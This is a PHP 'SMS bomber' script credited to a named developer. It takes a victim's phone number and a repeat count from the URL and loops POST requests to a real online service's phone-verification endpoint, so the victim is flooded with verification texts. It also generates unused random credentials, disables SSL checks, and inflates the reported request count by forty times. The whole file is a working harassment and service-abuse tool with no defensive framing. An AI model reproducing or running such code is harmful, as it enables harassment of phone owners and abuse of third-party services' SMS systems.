<?php
//Strings
$Phone = htmlspecialchars($_GET['phone']);
$count = htmlspecialchars($_GET['count']);
$count_final = $count +1;
$full_phone = "$Phone";
//============================================================================//
//#<<<<<<<Developer>>>>>>>#//
//#https://github.com/Antrax-QG
//#telegram: @navidshams 
//============================================================================//
//Random Function
function random($length, $type) {
if($type == "1"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "2"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "3"){
return substr(str_shuffle(str_repeat($x='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "4"){
return substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "5"){
return substr(str_shuffle(str_repeat($x='ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "6"){
return substr(str_shuffle(str_repeat($x='0123456789', ceil($length/strlen($x)) )),1,$length);
}
}
//===============================/*Coded: @navidshams*/=============================================//
//Random Strings
$i = 1;
while($i<$count_final){
$random_ab = random("24", "1");
$PHPSESSID = random("32", "2");
$Sheypoor = random("32", "2");
$fname = random("5", "4");
$lname = random("8", "4");
$password = random("12", "1");
$email_rand = random("7", "2");
$email = "$email_rand@gmail.com";
$AccountOAuthTempID = random("23", "1");
$guid = "".random("8", "3")."-".random("4", "3")."-".random("4", "3")."-".random("4", "3")."-".random("12", "3")."";
//-----------------------/*Coded : @navidshams*/-----------------------------------------------------//
$Sender = curl_init();
$Sender_Url = "https://pinket.com/api/cu/v1/phone_verification";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json;charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phoneNumber":"'.$Phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
$i++;
}
//============================================================================//
//Create Count Final
$all_request = $count * 40;
//============================================================================//
echo "$all_request OK Sended
";
//============================================================================//
//#<<<<<<<Developer>>>>>>>#//
//#https://github.com/Antrax-QG
//#telegram: @navidshams 
//============================================================================//
?>